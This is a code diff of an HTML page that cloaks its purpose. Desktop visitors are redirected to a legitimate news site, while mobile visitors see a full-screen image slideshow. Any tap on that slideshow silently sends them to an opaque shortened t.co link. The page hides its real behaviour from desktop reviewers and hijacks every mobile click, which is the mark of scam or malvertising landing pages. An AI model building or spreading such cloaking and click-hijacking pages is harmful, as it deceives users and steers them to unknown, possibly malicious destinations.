@@ -10,32 +10,51 @@
       padding: 0;
       height: 100%;
       width: 100%;
-      background: url('https://i.imgur.com/KRjnVF4.jpeg') no-repeat center center fixed;
+      overflow: hidden; /* hide scroll for desktop, scroll for mobile handled separately */
+      font-family: sans-serif;
+    }
+    .slide {
+      height: 100vh;
+      width: 100vw;
       background-size: cover;
-      cursor: pointer;
+      background-position: center;
+    }
+    .slides-container {
+      height: 100%;
+      width: 100%;
+      overflow-y: scroll;
+      scroll-snap-type: y mandatory;
+    }
+    .slide {
+      scroll-snap-align: start;
     }
   </style>
   <script>
     const desktopURL = "https://www.msn.com/it-it";
+    const mobileURL = "https://t.co/hw376Xavsh";
     const isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i
       .test(navigator.userAgent.toLowerCase());
 
     if (!isMobile) {
-      // Desktop users redirected immediately BEFORE loading the image
+      // Desktop users redirected immediately
       window.location.replace(desktopURL);
     }
   </script>
 </head>
 <body>
+  <!-- Mobile only content -->
+  <div class="slides-container">
+    <div class="slide" style="background-image: url('https://i.imgur.com/KRjnVF4.jpeg');"></div>
+    <div class="slide" style="background-image: url('https://i.imgur.com/4AiXzf8.jpeg');"></div>
+    <div class="slide" style="background-image: url('https://i.imgur.com/2nCt3Sbl.jpg');"></div>
+    <div class="slide" style="background-image: url('https://i.imgur.com/lG0Yb.jpg');"></div>
+  </div>
 
-<script>
-  const mobileURL = "https://t.co/hw376Xavsh";
-  
-  // Mobile users: redirect when clicking anywhere
-  document.body.addEventListener("click", () => {
-    window.location.href = mobileURL;
-  });
-</script>
-
+  <script>
+    // Mobile users: redirect on any click
+    document.body.addEventListener("click", () => {
+      window.location.href = mobileURL;
+    });
+  </script>
 </body>
 </html>
